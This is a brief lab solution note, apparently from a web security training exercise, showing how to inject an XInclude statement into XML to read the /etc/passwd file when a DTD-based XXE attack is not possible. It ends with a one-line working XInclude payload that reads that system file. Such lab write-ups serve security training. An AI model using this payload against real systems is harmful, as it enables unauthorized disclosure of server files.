Lab: Exploiting XInclude to retrieve files
Task: Inject an XInclude statement to retrieve the contents of the /etc/passwd file.
Note:  Can't control the entire XML document you can't define a DTD to launch a classic XXE attack.

soln:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
